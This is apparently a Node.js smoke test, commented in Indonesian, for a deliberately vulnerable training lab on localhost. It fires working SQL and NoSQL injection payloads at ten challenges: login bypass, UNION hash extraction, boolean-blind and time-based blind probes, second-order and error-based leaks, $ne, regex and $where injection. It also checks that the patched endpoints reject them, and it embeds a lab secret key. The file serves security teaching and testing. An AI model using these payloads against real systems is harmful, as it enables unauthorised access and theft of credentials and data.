#!/usr/bin/env node
// Smoke test komprehensif VulnLab — dijalankan SETELAH server up di :8100
// Melakukan uji exploit untuk 10 challenge + memverifikasi secret alami bocor.
const BASE = 'http://127.0.0.1:8100';
const sleep = (ms) => new Promise(r => setTimeout(r, ms));
let pass = 0, fail = 0;
const results = [];

function check(name, cond, extra = '') {
  if (cond) { pass++; results.push(`PASS  ${name}`); }
  else { fail++; results.push(`FAIL  ${name} ${extra}`); }
  console.log((cond ? 'PASS' : 'FAIL') + ' ' + name + (extra ? ' :: ' + extra : ''));
}

async function j(method, path, body) {
  const opts = { method, headers: {} };
  if (body !== undefined) { opts.headers['Content-Type'] = 'application/json'; opts.body = typeof body === 'string' ? body : JSON.stringify(body); }
  const r = await fetch(BASE + path, opts);
  let data = null;
  try { data = await r.json(); } catch { data = null; }
  return { status: r.status, data };
}

async function main() {
  console.log('=== SQLi ===');
  // T1 login bypass -> api key admin (secret)
  let r = await j('POST', '/api/sqli/ch1/login', { username: `' OR '1'='1'-- `, password: 'x' });
  check('T1 login bypass -> admin+secret', r.status === 200 && r.data?.ok && r.data?.data?.username === 'admin' && /^sk_admin_/.test(r.data?.data?.secret || ''), JSON.stringify(r.data));
  // T1 fixed: tidak boleh return secret, dan payload bypass gagal
  r = await j('POST', '/api/sqli/fixed/ch1/login', { username: `' OR '1'='1'-- `, password: 'x' });
  check('T1F fixed menolak bypass', r.status === 401, JSON.stringify(r.data));
  r = await j('POST', '/api/sqli/fixed/ch1/login', { username: 'admin', password: 'admin123' });
  check('T1F fixed login benar (tanpa secret)', r.status === 200 && r.data?.ok && !('secret' in (r.data?.data || {})), JSON.stringify(r.data));

  // T2 union => hash bcrypt admin lewat kolom nama
  r = await j('GET', '/api/sqli/ch2/search?q=' + encodeURIComponent(`x' UNION SELECT 1,hash,1,1 FROM users WHERE username='admin'-- `));
  let leakT2 = r.data?.data?.hasil?.map(h => h.nama + h.deskripsi).join('|') || '';
  check('T2 union extract hash admin', r.status === 200 && r.data?.ok && /\$2b\$10\$/.test(leakT2), JSON.stringify(r.data));

  // T3 blind boolean => email admin (diawali a)
  r = await j('GET', '/api/sqli/ch3/profile?id=' + encodeURIComponent(`1 AND (SELECT substr(email,1,1) FROM users WHERE username='admin')='a'`));
  check('T3 blind-bool TRUE oracle', r.status === 200 && r.data?.data?.ditemukan === true, JSON.stringify(r.data));
  r = await j('GET', '/api/sqli/ch3/profile?id=' + encodeURIComponent(`1 AND (SELECT substr(email,1,1) FROM users WHERE username='admin')='z'`));
  check('T3 blind-bool FALSE oracle', r.status === 200 && r.data?.data?.ditemukan === false, JSON.stringify(r.data));

  // T4 time-based => telepon admin (diawali 0)
  const t0 = Date.now();
  r = await j('GET', '/api/sqli/ch4/filter?kategori=' + encodeURIComponent(`x' OR (SELECT CASE WHEN (SELECT substr(telepon,1,1) FROM users WHERE username='admin')='0' THEN randomblob(50000000) ELSE 1 END) AND '1'='1`));
  const dur = Date.now() - t0;
  check('T4 time-based (delay>=300ms)', r.status === 200 && r.data?.ok && dur >= 300, `durasi=${dur}ms`);
  const t1 = Date.now();
  r = await j('GET', '/api/sqli/ch4/filter?kategori=' + encodeURIComponent(`x' OR (SELECT CASE WHEN (SELECT substr(telepon,1,1) FROM users WHERE username='admin')='6' THEN randomblob(50000000) ELSE 1 END) AND '1'='1`));
  const durFalse = Date.now() - t1;
  check('T4 no-delay saat FALSE', r.status === 200 && r.data?.ok && durFalse < 300, `durasi=${durFalse}ms`);

  // T5 second-order: register + report -> kode pesanan citra bocor
  const evilUser = `x' UNION SELECT kode,produk,total FROM pesanan WHERE pelanggan='citra'-- `;
  r = await j('POST', '/api/sqli/ch5/register', { username: evilUser, nama: 'Attacker', alamat: 'Jln Test' });
  const pid = r.data?.data?.pelanggan_id;
  check('T5 register pelanggan', r.status === 200 && r.data?.ok && pid !== undefined, JSON.stringify(r.data));
  r = await j('GET', `/api/sqli/ch5/report?pelanggan_id=${pid}`);
  const leakT5 = (r.data?.data?.laporan || []).map(l => l.kode).join('|');
  check('T5 second-order kode citra bocor', r.status === 200 && r.data?.ok && /INV-2026-0002/.test(leakT5), JSON.stringify(r.data));

  // T6 error-based => api key budi (secret)
  r = await j('GET', '/api/sqli/ch6/item?id=' + encodeURIComponent(`1 AND json_extract('{}', (SELECT secret FROM users WHERE username='budi'))`));
  check('T6 error-based leak secret budi', r.status === 500 && !r.data?.ok && /sk_budi_/.test(r.data?.error || ''), JSON.stringify(r.data));
  // T6 fixed
  r = await j('GET', '/api/sqli/fixed/ch6/item?id=' + encodeURIComponent(`1 AND json_extract('{}', (SELECT secret FROM users WHERE username='budi'))`));
  check('T6F fixed menolak payload (400)', [400, 500].includes(r.status), JSON.stringify(r.data));

  console.log('=== NoSQLi ===');
  // N1 $ne bypass -> api key admin mongo (secret)
  r = await j('POST', '/api/nosql/ch1/login', { username: { $ne: null }, password: { $ne: null } });
  check('N1 $ne bypass -> admin', r.status === 200 && r.data?.ok && r.data?.data?.username === 'admin' && /^sk_admin_/.test(r.data?.data?.secret || ''), JSON.stringify(r.data));
  r = await j('POST', '/api/nosql/fixed/ch1/login', { username: { $ne: null }, password: { $ne: null } });
  check('N1F fixed tolak operator (400)', r.status === 400, JSON.stringify(r.data));
  r = await j('POST', '/api/nosql/fixed/ch1/login', { username: 'admin', password: 'admin123' });
  check('N1F fixed login string benar', r.status === 200 && r.data?.ok && !('secret' in (r.data?.data || {})), JSON.stringify(r.data));

  // N2 blind regex => recovery code admin
  r = await j('GET', '/api/nosql/ch2/check?username=admin&prefix=' + encodeURIComponent(`REC-`));
  check('N2 regex prefix cocok', r.status === 200 && r.data?.data?.cocok === true, JSON.stringify(r.data));
  r = await j('GET', '/api/nosql/ch2/check?username=admin&prefix=zzz');
  check('N2 regex prefix salah -> false', r.status === 200 && r.data?.data?.cocok === false, JSON.stringify(r.data));

  // N3 operator pollution => kode batch VVIP
  r = await j('GET', '/api/nosql/ch3/search?filter=' + encodeURIComponent('{"visible":{"$ne":true}}'));
  const seen = (r.data?.data?.hasil || []).map(p => p.name).join(',');
  check('N3 filter pollution tampil VVIP', r.status === 200 && r.data?.ok && /Produk Rahasia VVIP/.test(seen) && (r.data?.data?.hasil || []).some(p => /BATCH-VVIP-2026-9X4K/.test(p.deskripsi || '')), JSON.stringify(r.data));
  r = await j('GET', '/api/nosql/fixed/ch3/search?filter=' + encodeURIComponent('{"visible":{"$ne":true}}'));
  check('N3F fixed tolak operator', r.status === 400, JSON.stringify(r.data));

  // N4 $where injection => token sesi admin (diawali ses_)
  r = await j('GET', '/api/nosql/ch4/debug?where=' + encodeURIComponent(`this.username=='admin' && this.token.startsWith('s')`));
  check('N4 $where true oracle -> jumlah 1', r.status === 200 && r.data?.data?.jumlah === 1, JSON.stringify(r.data));
  r = await j('GET', '/api/nosql/ch4/debug?where=' + encodeURIComponent(`this.username=='admin' && this.token.startsWith('z')`));
  check('N4 $where false oracle -> jumlah 0', r.status === 200 && r.data?.data?.jumlah === 0, JSON.stringify(r.data));

  console.log('=== META ===');
  r = await j('POST', '/api/meta/verify', { challenge_id: 'sqli-1', secret: 'sk_admin_9f3Kq2mZvX7c' });
  check('META verify true', r.status === 200 && r.data?.solved === true, JSON.stringify(r.data));
  r = await j('POST', '/api/meta/verify', { challenge_id: 'sqli-1', secret: 'salah' });
  check('META verify false', r.status === 200 && r.data?.solved === false, JSON.stringify(r.data));
  r = await j('GET', '/api/meta/challenges');
  check('META challenges list 10', r.status === 200 && r.data?.data?.length === 10, `n=${r.data?.data?.length}`);

  console.log(`\n===== HASIL: ${pass} pass, ${fail} fail =====`);
  process.exit(fail > 0 ? 1 : 0);
}

main().catch(e => { console.error('FATAL:', e.message); process.exit(2); });